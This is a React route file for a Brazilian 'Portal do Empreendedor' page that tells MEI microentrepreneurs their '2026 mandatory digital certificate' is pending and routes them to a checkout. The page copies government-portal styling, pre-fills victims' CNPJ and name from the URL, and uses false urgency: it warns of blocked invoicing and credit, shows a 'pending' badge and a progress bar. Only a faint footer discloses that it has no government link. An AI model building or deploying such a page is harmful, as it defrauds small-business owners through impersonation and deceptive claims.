import { createFileRoute, Link } from "@tanstack/react-router";
import { z } from "zod";
import { Info, FileCheck2, Lock, User } from "lucide-react";
import { SiteHeader, Breadcrumb, SiteFooter, Page } from "@/components/layout/SiteChrome";
import { formatCNPJ, formatDateBR } from "@/lib/format";
import certificadoA1Asset from "@/assets/certificado-a1-emei.jpg.asset.json";

const searchSchema = z.object({
  nome: z.string().optional(),
  cnpj: z.string().optional(),
  abertura: z.string().optional(),
  token: z.string().optional(),
});

export const Route = createFileRoute("/modelo")({
  validateSearch: (s) => searchSchema.parse(s),
  head: () => ({
    meta: [
      { title: "Portal do Empreendedor — Certificado Digital MEI" },
      {
        name: "description",
        content:
          "Portal do Empreendedor — Certificado Digital MEI",
      },
      { property: "og:title", content: "Portal do Empreendedor — Certificado Digital MEI" },
      {
        property: "og:description",
        content: "Portal do Empreendedor — Certificado Digital MEI",
      },
    ],
  }),
  component: HomePage,
});

function HomePage() {
  const { nome, cnpj, abertura, token } = Route.useSearch();
  const cnpjFmt = cnpj ? formatCNPJ(cnpj) : "—";
  const nomeFmt = nome?.trim() || "—";
  const aberturaFmt = abertura ? formatDateBR(abertura) : "—";

  const checkoutSearch: Record<string, string> = {};
  if (token) {
    checkoutSearch.token = token;
  } else {
    if (cnpj) checkoutSearch.cnpj = cnpj;
    if (nome) checkoutSearch.nome = nome;
  }

  return (
    <Page>
      <SiteHeader userName={nome} userDoc={cnpj} />
      <Breadcrumb
        items={[
          { label: "Empresas & Negócios" },
          { label: "Empreendedor" },
        ]}
      />

      <main className="flex-1">
        <div className="mx-auto w-full max-w-[720px] px-3.5 py-6 space-y-4 sm:px-4">
          {/* Yellow info card */}
          <div className="flex gap-3 rounded-md border border-[#ffeeba] border-l-4 border-l-[#ffc107] bg-[#fcf4d4] p-4 text-[13px] shadow-sm">
            <Info className="mt-0.5 h-4 w-4 shrink-0 text-[#856404]" />
            <div className="leading-relaxed text-[#856404]">
              <p>
                Seu MEI possui o <span className="font-bold">Certificado Digital 2026 pendente</span>. Sem a emissão, seu CNPJ pode ser bloqueado para emissão de notas fiscais e acesso a crédito. <span className="font-bold underline cursor-pointer">Regularize agora.</span>
              </p>
            </div>
          </div>

          {/* Success locator card */}
          <div className="flex items-center gap-4 rounded-md border border-border border-l-4 border-l-[#004884] bg-card p-4 shadow-sm">
            <div className="flex h-11 w-11 shrink-0 items-center justify-center rounded-full bg-[#f0f5ff] text-[#004884]">
              <FileCheck2 className="h-5 w-5" />
            </div>
            <div className="min-w-0">
              <div className="text-[15px] font-bold text-[#004884]">
                Cadastro localizado com sucesso
              </div>
              <div className="text-[13px] text-muted-foreground">
                Confira os dados do seu MEI e prossiga para a emissão do certificado digital.
              </div>
            </div>
          </div>

          {/* Data card */}
          <div className="overflow-hidden rounded-md border border-border bg-card">
            <div className="bg-[#f8f9fa] border-b border-border px-4 py-2.5 text-[14px] font-bold text-[#004884] uppercase tracking-tight">
              Dados do Microempreendedor Individual
            </div>
            <DataRow label="CNPJ" value={cnpjFmt} />
            <DataRow label="TITULAR" value={nomeFmt} />
            <DataRow label="DATA DE ABERTURA" value={aberturaFmt} />
            <DataRow
              label="SITUAÇÃO CADASTRAL"
              value={
                <span className="inline-flex items-center rounded-sm bg-[#138835] px-2 py-0.5 text-[10px] font-bold uppercase text-white">
                  Ativa
                </span>
              }
            />
            <DataRow label="TIPO" value="Microempreendedor Individual" last />
          </div>

          {/* Progress card */}
          <div className="rounded-md border border-border bg-card p-4">
            <div className="flex items-center justify-between text-[13px]">
              <span className="text-muted-foreground">Progresso da contratação</span>
              <span className="font-semibold text-[#004884]">Etapa 2 de 3 — quase lá</span>
            </div>
            <div className="mt-3 h-2 w-full overflow-hidden rounded-full bg-muted">
              <div className="h-full w-[65%] rounded-full bg-[#004884]" />
            </div>
            <div className="mt-3 flex flex-wrap justify-between gap-2 text-[12px]">
              <span className="flex items-center gap-1 text-[#138835]"><span className="text-[8px]">●</span> Identificação</span>
              <span className="flex items-center gap-1 text-[#138835]"><span className="text-[8px]">●</span> Dados confirmados</span>
              <span className="flex items-center gap-1 text-[#004884]"><span className="text-[8px]">●</span> Emitir certificado</span>
            </div>
          </div>

          {/* Service card */}
          <div className="rounded-md border border-border bg-card p-0 overflow-hidden shadow-sm">
            {/* Certificate image with pending overlay */}
            <div className="relative border-b border-border bg-[#f0f5ff]">
              <img
                src={certificadoA1Asset.url}
                alt="Certificado Digital A1 e-MEI"
                className="block w-full h-auto opacity-60 grayscale-[30%] select-none pointer-events-none"
                draggable={false}
              />
              <div className="absolute inset-0 bg-slate-900/10" />
              <div className="absolute top-3 right-3 inline-flex items-center gap-1.5 rounded-full bg-[#ffc107] px-3 py-1 text-[11px] font-bold uppercase tracking-wide text-[#856404] shadow-md">
                <span className="h-2 w-2 rounded-full bg-[#856404] animate-pulse" />
                Pendente
              </div>
              <div className="absolute bottom-3 left-3 rounded-md bg-white/95 px-2.5 py-1 text-[10.5px] font-semibold uppercase tracking-wide text-[#8a6d3b] shadow">
                Certificado desativado — aguardando emissão
              </div>
            </div>
            <div className="flex items-start gap-4 p-5">
              <div className="flex h-12 w-12 shrink-0 items-center justify-center rounded-md bg-[#f0f5ff] text-[#004884]">
                <User className="h-6 w-6" />
              </div>
              <div className="min-w-0 flex-1">
                <div className="text-[16px] font-bold text-[#004884] leading-snug">
                  Certificado Digital MEI — Emissão Obrigatória 2026
                </div>
                <p className="mt-1.5 text-[13px] text-foreground/90 leading-relaxed">
                  Seu CNPJ foi localizado e está <span className="font-bold">aguardando a emissão do certificado</span>. Prossiga agora para regularizar e receber seu certificado digital.
                </p>
                <p className="mt-2.5 text-[12.5px] text-muted-foreground">
                  Não deixe para depois — CNPJs sem certificado ficam sujeitos a restrições operacionais.
                </p>
              </div>
            </div>
            <div className="bg-[#f8f9fa] border-t border-border p-4 flex justify-center">
              <Link
                to="/checkout"
                search={checkoutSearch}
                className="inline-flex min-h-[44px] w-full max-w-[280px] items-center justify-center gap-2 rounded-md bg-[#1351b4] px-6 text-[13px] font-bold uppercase tracking-wide text-white transition-all hover:bg-[#004884] active:scale-[0.98]"
              >
                <Lock className="h-4 w-4" />
                Emitir Certificado Digital
              </Link>
            </div>
          </div>

          {/* Disclaimer */}
          <div className="flex gap-2.5 rounded-md border border-border bg-muted/40 p-4 text-left text-[12.5px] text-muted-foreground">
            <Info className="h-4 w-4 shrink-0" />
            <p>
              MEIs sem o Certificado Digital 2026 podem ter restrições na emissão de notas fiscais e no acesso a linhas de crédito para microempreendedores.
            </p>
          </div>

          <div className="pt-4 text-center text-[10.5px] text-muted-foreground/60">
            CadastroMEI é um serviço de apoio ao MEI e não possui vínculo com o Governo Federal. O uso é opcional e complementar às orientações oficiais.
          </div>
        </div>
      </main>

      <SiteFooter />
    </Page>
  );
}

function DataRow({
  label,
  value,
  last,
}: {
  label: string;
  value: React.ReactNode;
  last?: boolean;
}) {
  return (
    <div className={last ? "px-4 py-3" : "border-b border-border px-4 py-3"}>
      <div className="text-[11px] font-semibold uppercase tracking-wide text-muted-foreground">
        {label}
      </div>
      <div className="mt-0.5 text-[14px] text-foreground">{value}</div>
    </div>
  );
}